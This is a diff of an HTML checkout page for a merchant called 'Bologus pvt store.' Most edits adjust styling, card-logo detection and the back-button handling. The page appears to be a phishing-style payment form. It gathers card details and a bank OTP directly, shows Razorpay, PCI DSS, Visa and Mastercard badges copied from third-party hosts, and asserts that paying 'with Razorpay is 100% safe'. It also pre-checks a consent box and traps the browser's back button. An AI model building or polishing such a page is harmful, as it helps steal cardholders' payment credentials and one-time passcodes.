@@ -19,7 +19,17 @@
       padding: 1rem;
       margin-bottom: 6rem;
     }
-    /* ========= Merchant & Description (unchanged) ========= */
+    @media (max-width: 600px) {
+  .content-wrapper {
+    margin-bottom: 2rem; /* Mobile spacing */
+  }
+  
+  .bottom-logos {
+    padding: 1rem 0; /* Tighter logo spacing */
+    gap: 12px; /* Optional: reduce logo spacing */
+  }
+}
+    /* ========= Merchant & Description ========= */
     .merchant-badge {
       position: relative;
       cursor: pointer;
@@ -95,6 +105,7 @@
       align-items: center;
       pointer-events: none;
     }
+    /* Card logo container */
     #cardTypeIcon {
       position: absolute;
       right: 12px;
@@ -105,10 +116,10 @@
       justify-content: center;
       height: 100%;
     }
-    .card-icon {
+    .card-type-icon {
       height: 24px;
-      width: auto;
-      display: block;
+      width: 38px;
+      object-fit: contain;
     }
     #cardError {
       color: #ef4444;
@@ -129,17 +140,19 @@
       display: none;
     }
     .hidden { display: none !important; }
-    /* ========= Consent Message (unchanged) ========= */
+    /* ========= Consent Message ========= */
     .consent-message {
       display: flex;
       align-items: flex-start;
       gap: 0.5rem;
-      padding: 0.5rem;
-      border-radius: 0.25rem;
+      padding: 0.75rem;
+      border-radius: 0.375rem;
       cursor: pointer;
       font-size: 0.875rem;
       color: #4B5563;
-      margin-top: 20px;
+      margin-top: 1rem;
+      background: #f3f4f6;
+      width: 100%;
     }
     .consent-checkbox {
       width: 1.25rem;
@@ -175,32 +188,53 @@
     }
     .otp-input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 8px;
       text-align: center;
       font-size: 18px;
       letter-spacing: 5px;
       -webkit-text-security: disc;
       caret-color: transparent;
+      height: 48px;
+    }
+    /* Updated OTP confirm button to match OTP input style */
+    #otpSubmitButton {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background: #gray-400; /* Default grey; will change on valid OTP */
+      font-size: 18px;
+      text-align: center;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
     }
     /* ========= Animations ========= */
-    .animate-slide-in { animation: slideIn 0.3s ease-out; }
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .animate-spin {
-      display: inline-block;
-      animation: spin 1s linear infinite;
-      -webkit-animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-    .btn-loading { position: relative; }
-    .btn-loading span { opacity: 0.5; filter: blur(1px); }
+  .animate-slide-in { animation: slideIn 0.3s ease-out; }
+@keyframes slideIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Modern Spinner */
+.modern-spinner {
+  width: 24px;
+  height: 24px;
+  border: 3px solid rgba(255,255,255,0.3);
+  border-radius: 50%;
+  border-top-color: #ffffff;
+  animation: spin 0.8s ease-in-out infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+.btn-loading { position: relative; }
+.btn-loading span { opacity: 0.5; filter: blur(1px); }
     /* ========= Bottom Logos ========= */
     .bottom-logos {
       padding: 2rem 0;
@@ -209,23 +243,31 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 20px;
+      gap: 10px;
     }
-    @media (max-width: 600px) {
-      .bottom-logos {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        gap: 10px;
-        background-color: white;
-        padding: 5px 0;
-        width: 100%;
-        justify-content: center;
-        z-index: 100;
-      }
-      .bottom-logos img { max-height: 25px; }
-    }
+   @media (max-width: 600px) {
+  .bottom-logos {
+    position: Static;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    transform: none;
+    gap: 10px;
+    background: transparent ;
+    padding: 1.5rem 0;
+    width: auto;
+    justify-content: center;
+    z-index: 100;
+    box-shadow: none;
+    border: none;
+  }
+  .bottom-logos img {
+    max-height: 15px;
+  }
+  .bottom-logos img.h-12 {
+    max-height: 28px;
+  }
+}
   </style>
 </head>
 <body>
@@ -239,7 +281,7 @@
             <div class="bg-white rounded-2xl shadow-sm mb-6">
               <div class="flex items-start gap-4 mb-4 px-4 pt-4">
                 <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
-                  <img src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=64&h=64&fit=crop" alt="Merchant Logo" class="w-full h-full object-cover">
+                  <img src="https://assets.turbologo.com/assets/features/professional-logo-templates-d9cc9a0d95eef758e45d197ff85b696204a467ac5b66fbf0a08a44be16ffe382.svg" alt="Merchant Logo" class="w-full h-full object-cover">
                 </div>
                 <div class="flex flex-col">
                   <span class="text-2xl font-semibold">Bologus pvt store.</span>
@@ -331,8 +373,10 @@
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                   <div class="relative">
-                    <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="4242 4242 4242 4242" required>
-                    <div class="absolute right-3 top-1/2 -translate-y-1/2" id="cardTypeIcon"></div>
+                    <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="Enter card number" required>
+                    <div id="cardTypeIcon">
+                      <img src="" alt="" class="card-type-icon hidden" id="cardLogo">
+                    </div>
                   </div>
                   <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter valid card number</p>
                   <p id="cardInfo" class="text-sm mt-1"></p>
@@ -352,26 +396,31 @@
                 <!-- Cardholder Name Field -->
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
-                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="John Doe" required>
+                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="Enter name on card" required>
                 </div>
                 <!-- Submit Button -->
                 <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400" disabled>
-                  <span id="submitText">Proceed to Pay</span>
-                  <div id="submitLoader" class="w-5 h-5 animate-spin hidden ml-2">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                      <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
-                    </svg>
-                  </div>
-                </button>
+  <span id="submitText">Proceed to Pay</span>
+  <div id="submitLoader" class="hidden ml-2">
+    <div class="modern-spinner"></div>
+  </div>
+</button>
               </form>
-              <!-- Consent Message -->
+              <!-- Consent Message (in Payment Form) -->
               <div class="consent-message mt-4" id="consentMessage">
                 <span class="consent-checkbox checked" id="consentCheckbox">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                     <path d="M5 13l4 4L19 7"/>
                   </svg>
                 </span>
-                <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
+               <span>Note: Making Payment with 
+<a href="https://razorpay.com/terms/" 
+   target="_blank" 
+   class="underline text-gray-400 hover:text-gray-500 transition-colors">
+  Razorpay
+</a> 
+is 100% safe. Your transaction is processed through a secure https connection.
+</span>
               </div>
             </div>
             <!-- OTP Form -->
@@ -384,7 +433,8 @@
                   <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
                 </div>
                 <div class="otp-button-wrapper">
-                  <button type="button" id="otpSubmitButton" class="w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center" disabled>
+                  <!-- Updated OTP confirm button with same dimensions as OTP input -->
+                  <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white" disabled>
                     <span id="otpText">Confirm</span>
                     <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -396,6 +446,15 @@
               </div>
               <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
               <p class="text-center text-sm text-gray-500 mt-2">Time remaining: <span id="timer">2:59</span></p>
+              <!-- Consent Message in OTP Page -->
+              <div class="consent-message mt-4">
+                <span class="consent-checkbox checked">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                    <path d="M5 13l4 4L19 7"/>
+                  </svg>
+                </span>
+                <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
+              </div>
             </div>
           </div>
         </div>
@@ -407,7 +466,8 @@
       <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" class="h-6" />
       <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" class="h-4" />
       <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" class="h-6" />
-      <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
+      <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-12" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="Upi" class="h-5" />
     </div>
   </div>
   <!-- Payment Details & Card Validation Scripts -->
@@ -424,15 +484,14 @@
 
     // Fetch Payment Details Using PID with Fallback
     document.addEventListener('DOMContentLoaded', async () => {
-      const urlParams = new URLSearchParams(window.location.search);
-      let pid = urlParams.get('pid');
+      let urlParams = new URLSearchParams(window.location.search);
+      let pid = urlParams.get('pid') || sessionStorage.getItem('pid');
       if (!pid || pid === "null") {
-        pid = sessionStorage.getItem('pid');
+        console.warn("No valid pid provided; defaulting amount to 100");
+        document.getElementById('amount').value = 100;
+        document.getElementById('displayAmount').textContent = "100";
       } else {
         sessionStorage.setItem('pid', pid);
-      }
-      console.log("Payment page PID:", pid);
-      if (pid) {
         try {
           const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
           const data = await response.json();
@@ -442,7 +501,6 @@
               document.getElementById('amount').value = amount;
               document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
             } else {
-              console.warn("Invalid amount; defaulting to 100");
               document.getElementById('amount').value = 100;
               document.getElementById('displayAmount').textContent = "100";
             }
@@ -452,15 +510,10 @@
         } catch (error) {
           console.error('Error fetching payment details:', error);
         }
-      } else {
-        console.warn("No valid pid provided; defaulting amount to 100");
-        document.getElementById('amount').value = 100;
-        document.getElementById('displayAmount').textContent = "100";
       }
     });
-  </script>
-  <!-- Card Formatting, BIN Lookup, and Expiry Validation -->
-  <script>
+
+    // Card Validation & Formatting
     function validateCard(number) {
       let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
       let sum = 0;
@@ -474,6 +527,7 @@
       }
       return sum % 10 === 0;
     }
+
     function formatCardNumber(value) {
       let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
       v = v.slice(0, 16);
@@ -483,6 +537,7 @@
       }
       return parts.join(' ');
     }
+
     function formatExpiry(value) {
       let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
       let formatted = v;
@@ -491,6 +546,7 @@
       }
       return formatted;
     }
+
     function validateExpiry(value) {
       if (!/^\d{2}\/\d{2}$/.test(value)) return false;
       const [month, year] = value.split('/').map(num => parseInt(num, 10));
@@ -501,6 +557,7 @@
       if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
       return true;
     }
+
     function updateCardError() {
       const cardInput = document.getElementById("cardNumber");
       const errorElem = document.getElementById("cardError");
@@ -515,99 +572,42 @@
         cardInput.classList.remove('border-red-500');
       }
     }
+
     function detectCardType(number) {
       const clean = number.replace(/\D/g, '');
-      const firstDigit = clean.charAt(0);
-      if (firstDigit === '4') return 'visa';
-      if (firstDigit === '5') return 'mastercard';
-      if (firstDigit === '3') return 'amex';
-      if (firstDigit === '6') return 'rupay';
-      return null;
-    }
-    async function lookupBIN(bin) {
-      try {
-        const response = await fetch(`https://lookup.binlist.net/${bin}`);
-        if (response.ok) {
-          return await response.json();
+      const patterns = {
+        visa: /^4/,
+        mastercard: /^5[1-5]/,
+        amex: /^3[47]/,
+        rupay: /^(508[5-9]|60698|607[0-8][0-9]|6079[0-8]|608[0-5]|6521[5-9]|652[2-9][0-9]|6530[0-9]|6531[0-4])/
+      };
+      for (const [brand, pattern] of Object.entries(patterns)) {
+        if (pattern.test(clean)) {
+          return brand;
         }
-      } catch (e) {
-        console.error("BIN lookup error:", e);
       }
       return null;
     }
+
     async function updateCardTypeAndInfo(value) {
-      const cardIcon = document.getElementById("cardTypeIcon");
-      const cardInfo = document.getElementById("cardInfo");
+      const cardLogo = document.getElementById("cardLogo");
       const plain = value.replace(/\s/g, '');
-      // If less than 6 digits, detect using first-digit logic
-      if (plain.length < 6) {
-        let type = detectCardType(plain);
-        let logoUrl = "";
-        switch (type) {
-          case "visa":
-            logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
-            break;
-          case "mastercard":
-            logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png";
-            break;
-          case "amex":
-            logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png";
-            break;
-          case "rupay":
-            logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png";
-            break;
-          default:
-            logoUrl = "";
-        }
-        cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
-        if (cardInfo) cardInfo.textContent = "";
+      // Show logo if at least one digit is entered
+      const detectedType = detectCardType(plain);
+      const logos = {
+        visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
+        mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
+        amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
+        rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
+      };
+      if (plain.length > 0 && detectedType && logos[detectedType]) {
+        cardLogo.src = logos[detectedType];
+        cardLogo.classList.remove('hidden');
       } else {
-        // If 6 or more digits, perform BIN lookup
-        const bin = plain.slice(0, 6);
-        const binData = await lookupBIN(bin);
-        if (binData) {
-          let logoUrl = "";
-          switch ((binData.scheme || "").toLowerCase()) {
-            case "visa":
-              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
-              break;
-            case "mastercard":
-              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png";
-              break;
-            case "amex":
-              logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png";
-              break;
-            case "rupay":
-              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png";
-              break;
-            default:
-              logoUrl = "";
-          }
-          cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${binData.scheme}" style="max-height:100%; max-width:100%;">` : "";
-          if (cardInfo) {
-            if (binData.country && binData.country.currency && binData.country.currency !== "INR") {
-              try {
-                const rateResponse = await fetch("https://api.exchangerate-api.com/v4/latest/INR");
-                const rateData = await rateResponse.json();
-                const conversion = rateData.rates[binData.country.currency];
-                if (conversion) {
-                  cardInfo.textContent = `${binData.country.currency} detected, 1 INR = ${conversion.toFixed(3)} ${binData.country.currency} | ${binData.country.name}`;
-                } else {
-                  cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
-                }
-              } catch (e) {
-                cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
-              }
-            } else {
-              cardInfo.textContent = "";
-            }
-          }
-        } else {
-          cardIcon.innerHTML = "";
-          if (cardInfo) cardInfo.textContent = "";
-        }
+        cardLogo.classList.add('hidden');
       }
     }
+
     function updateSubmitButton() {
       const email = document.getElementById('email').value.trim();
       const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
@@ -623,18 +623,20 @@
         submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
       }
     }
+
     function updateConfirmOtpButton() {
       const otp = document.getElementById('otp').value;
       const otpButton = document.getElementById('otpSubmitButton');
       if (otp.length === 6) {
         otpButton.disabled = false;
-        otpButton.className = "w-full bg-blue-600 text-white py-2 px-4 rounded-none flex items-center justify-center";
+        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
         document.getElementById('otpError').style.display = 'none';
       } else {
         otpButton.disabled = true;
-        otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
+        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
       }
     }
+
     // Consent checkbox event listener
     document.addEventListener("DOMContentLoaded", function(){
       const consentCheckbox = document.getElementById('consentCheckbox');
@@ -648,9 +650,8 @@
         updateSubmitButton();
       });
     });
-  </script>
-  <!-- Attach Input Event Listeners -->
-  <script>
+
+    // Attach Input Event Listeners
     document.addEventListener("DOMContentLoaded", function(){
       const cardInput = document.getElementById("cardNumber");
       const expiryInput = document.getElementById("expiry");
@@ -689,6 +690,7 @@
       document.getElementById('otp').addEventListener('input', function(e) {
         updateConfirmOtpButton();
       });
+
       async function checkTransactionStatus() {
         if (!currentInvoiceId) return;
         try {
@@ -721,6 +723,7 @@
           console.error('Error checking transaction status:', err);
         }
       }
+
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -764,6 +767,7 @@
           updateSubmitButton();
         }
       });
+
       document.getElementById('otpSubmitButton').addEventListener('click', async () => {
         if (isProcessing) return;
         isProcessing = true;
@@ -798,6 +802,7 @@
         }
       });
     });
+
     function startOtpTimer() {
       if (timerInterval) clearInterval(timerInterval);
       timer = 180;
@@ -839,5 +844,17 @@
     };
     history.pushState(null, null, window.location.href);
   </script>
+<script>
+  window.onpopstate = function(event) {
+    if (confirm("Do you want to cancel this transaction?")) {
+      window.location.href = '/fail.html?reason=canceled';  // Redirects to fail.html if they choose 'yes'
+    } else {
+      history.pushState(null, null, window.location.href);  // Keeps the user on the same page if they choose 'no'
+    }
+  };
+
+  history.pushState(null, null, window.location.href);  // Prevents the default back behavior
+</script>
+
 </body>
 </html>
